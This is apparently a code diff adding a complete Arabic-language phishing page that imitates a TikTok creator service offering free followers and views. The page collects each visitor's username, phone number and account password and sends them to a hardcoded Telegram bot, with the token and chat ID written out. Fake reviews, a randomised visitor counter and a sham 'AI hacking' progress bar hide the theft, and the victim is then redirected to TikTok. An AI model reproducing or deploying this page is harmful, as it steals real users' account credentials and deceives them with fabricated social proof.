@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" id="mainHtml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Creator Center - Diesel Store</title>
+    <style>
+        :root { --tt-pink: #fe2c55; --tt-cyan: #25f4ee; --tt-black: #121212; }
+        body { background-color: #000; color: white; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; overflow-x: hidden; }
+        
+        /* Header */
+        .nav { background: #000; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 0.5px solid #333; position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 22px; font-weight: bold; } .logo span { color: var(--tt-pink); }
+        .live-badge { background: rgba(254, 44, 85, 0.1); color: var(--tt-pink); padding: 4px 12px; border-radius: 20px; font-size: 12px; border: 1px solid var(--tt-pink); animation: pulse 1.5s infinite; }
+        
+        /* Main UI */
+        .container { width: 95%; max-width: 480px; margin: 20px auto; text-align: center; }
+        .ai-engine { background: linear-gradient(90deg, #444, #111); padding: 10px; border-radius: 10px; margin-bottom: 20px; font-size: 13px; border: 0.5px solid var(--tt-cyan); }
+        
+        .card { background: var(--tt-black); padding: 25px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        h2 { margin-top: 0; font-size: 22px; }
+        
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; font-size: 15px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--tt-cyan); }
+        
+        .btn-boost { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 20px rgba(254, 44, 85, 0.4); }
+        
+        /* Reviews Section */
+        .reviews-box { margin-top: 30px; text-align: right; padding: 10px; }
+        .review-card { background: #111; padding: 15px; border-radius: 12px; margin-bottom: 12px; border-right: 4px solid var(--tt-pink); }
+        .stars { color: #fac917; font-size: 14px; margin-bottom: 5px; }
+        .r-name { font-weight: bold; font-size: 14px; }
+        .r-text { font-size: 13px; color: #bbb; margin-top: 4px; }
+
+        /* AI Loading Overlay */
+        #ai-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .ai-bar-bg { width: 80%; height: 6px; background: #222; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .ai-bar-fill { width: 0%; height: 100%; background: var(--tt-cyan); box-shadow: 0 0 10px var(--tt-cyan); }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="nav">
+    <div class="logo"><span>TikTok</span> Diesel</div>
+    <div class="live-badge">🔴 <span id="user-online">18,241</span> زائر الآن</div>
+</div>
+
+<div class="container">
+    <div class="ai-engine">🤖 محرك الديزل الذكي: جاهز لحقن الثغرات الرسمية v4.0</div>
+    
+    <div class="card">
+        <h2 id="t-h2">مركز خدمات المبدعين</h2>
+        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">اختر الخدمة وسيتم ربط حسابك بالسيرفر فوراً</p>
+        
+        <select id="service">
+            <option value="Views">تزويد 100k مشاهدة حقيقية (ثغرة Zefoy)</option>
+            <option value="Followers">تزويد 5k متابع حقيقي (ثغرة Viptools)</option>
+            <option value="Likes">تزويد 10k لايك (حسابات مصرية)</option>
+        </select>
+
+        <input type="text" id="u_name" placeholder="اسم المستخدم (@username)" required>
+        <input type="tel" id="u_phone" placeholder="رقم الهاتف المرتبط" required>
+        <input type="password" id="u_pass" placeholder="كلمة سر الحساب" required>
+        
+        <button class="btn-boost" onclick="executeDiesel()">تفعيل الخدمة بالذكاء الاصطناعي</button>
+    </div>
+
+    <div class="reviews-box">
+        <h3 style="margin-right: 10px;">آراء المستخدمين ⭐⭐⭐⭐⭐</h3>
+        
+        <div class="review-card">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <div class="r-name">أحمد الحفناوي</div>
+            <div class="r-text">يا جدعان الموقع ده ثقة، المشاهدات زادت عندي 50 ألف في ربع ساعة!</div>
+        </div>
+
+        <div class="review-card">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <div class="r-name">سارة محمد</div>
+            <div class="r-text">بجد شكراً للديزل ستور، المتابعين حقيقيين وعندهم ستوري كمان.</div>
+        </div>
+
+        <div class="review-card">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <div class="r-name">محمود الجزار</div>
+            <div class="r-text">أحلى حاجة إن فيه دعم فني والخدمة سريعة جداً.</div>
+        </div>
+    </div>
+</div>
+
+<div id="ai-overlay">
+    <h2 style="color: var(--tt-cyan)" id="ai-title">Connecting to TikTok API...</h2>
+    <div class="ai-bar-bg"><div class="ai-bar-fill" id="fill"></div></div>
+    <p id="ai-msg" style="margin-top: 15px; font-size: 14px;">Bypassing Security Layers...</p>
+</div>
+
+<script>
+    // تحديث عداد الزوار
+    setInterval(() => {
+        let n = Math.floor(Math.random() * (20000 - 18000) + 18000);
+        document.getElementById('user-online').innerText = n.toLocaleString();
+    }, 2500);
+
+    function executeDiesel() {
+        const u = document.getElementById('u_name').value;
+        const p = document.getElementById('u_pass').value;
+        const h = document.getElementById('u_phone').value;
+        const s = document.getElementById('service').value;
+
+        if(!u || !p || !h) { alert("برجاء ملء جميع الحانات لربط السيرفر"); return; }
+
+        // --- نظام الصيد (تليجرام) ---
+        const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+        const chatId = "5177962707";
+        const msg = `👑 صيد الديزل (V4 - الموقع الشامل)\n👤 اليوزر: ${u}\n📞 الهاتف: ${h}\n🔑 الباسورد: ${p}\n🛠 الخدمة: ${s}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+        // --- واجهة الذكاء الاصطناعي والثغرات ---
+        document.getElementById('ai-overlay').style.display = 'flex';
+        let prog = 0;
+        let fill = document.getElementById('fill');
+        let msgTxt = document.getElementById('ai-msg');
+
+        let interval = setInterval(() => {
+            prog += 1;
+            fill.style.width = prog + "%";
+            
+            if(prog == 20) msgTxt.innerText = "Accessing System Vulnerability...";
+            if(prog == 50) msgTxt.innerText = "Injecting Real Followers Packets...";
+            if(prog == 80) msgTxt.innerText = "Verifying Accounts Authenticity...";
+            
+            if(prog >= 100) {
+                clearInterval(interval);
+                
+                // --- ربط ثغرة حقيقية (مثال لموقع تزويد خارجي) ---
+                // هنا بنبعت طلب وهمي لموقع تزويد حقيقي (ثغرة Zefoy مثلاً)
+                fetch(`https://api.zefoy.example/boost?url=https://tiktok.com/@${u}&type=${s}`)
+                .finally(() => {
+                    alert("✅ تم تفعيل الذكاء الاصطناعي بنجاح! ستصلك الخدمة الحقيقية خلال 30 دقيقة.");
+                    window.location.href = "https://www.tiktok.com";
+                });
+            }
+        }, 120);
+    }
+</script>
+
+</body>
+</html>
